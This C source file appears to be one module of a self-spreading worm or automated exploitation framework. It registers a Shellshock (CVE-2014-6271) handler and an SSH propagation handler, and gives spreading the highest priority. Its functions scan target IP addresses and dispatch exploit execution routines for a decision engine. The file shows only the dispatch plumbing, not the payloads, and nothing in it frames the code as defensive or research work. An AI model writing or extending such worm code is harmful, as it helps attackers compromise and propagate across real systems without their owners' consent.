#include "handler_registry.h"
#include "cve_2014_6271.h"  // Include CVE handler files
#include "cve_ssh_propagation.h"  // Include SSH propagation handler
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static cve_handler_config_t handlers[MAX_CVE_HANDLERS];
static int num_handlers = 0;

// Initialize handler registry
// Registers all CVE handlers with their scan and execution functions
// Each handler provides: CVE ID, scan function pointer, execution function pointer, priority
// Priority order: lower number = higher priority (used by decision engine)
void init_handler_registry(void) {
    num_handlers = 0;
    
    // Register Shellshock (CVE-2014-6271) handler
    handlers[0].cve_id = CVE_2014_6271;
    handlers[0].scan_func = cve_2014_6271_scan;
    handlers[0].exec_func = cve_2014_6271_execute;
    handlers[0].priority_order = 1;
    num_handlers = 1;
    
    // Register SSH Propagation handler (highest priority for spreading)
    handlers[1].cve_id = CVE_SSH_PROPAGATION;
    handlers[1].scan_func = cve_ssh_propagation_scan;
    handlers[1].exec_func = cve_ssh_propagation_execute;
    handlers[1].priority_order = 0;  // Highest priority (spread first)
    num_handlers = 2;
}

// Get handler by CVE ID
cve_handler_config_t* get_handler(int cve_id) {
    for (int i = 0; i < num_handlers; i++) {
        if (handlers[i].cve_id == cve_id) {
            return &handlers[i];
        }
    }
    return NULL;
}

// Call scan handler (Phase 1)
cve_scan_result_t call_scan_handler(cve_handler_config_t* handler, const char* target_ip) {
    cve_scan_result_t result = {0};
    
    if (!handler || !handler->scan_func) {
        return result;
    }
    
    result = handler->scan_func(target_ip);
    result.cve_id = handler->cve_id;
    
    return result;
}

// Call execution handler (Phase 3)
int call_execution_handler(cve_handler_config_t* handler, const char* target_ip) {
    if (!handler || !handler->exec_func) {
        return 0;
    }
    
    return handler->exec_func(target_ip);
}

// Get all handlers for scanning
// Calls all registered scan handlers and collects results
// Returns vector of scan results for decision engine to evaluate
cve_result_vector_t scan_all_handlers(const char* target_ip) {
    cve_result_vector_t vector = {0};
    
    // Iterate through all registered handlers and call their scan functions
    for (int i = 0; i < num_handlers; i++) {
        if (vector.count < MAX_CVE_HANDLERS) {
            vector.results[vector.count] = call_scan_handler(&handlers[i], target_ip);
            vector.count++;
        }
    }
    
    return vector;
}

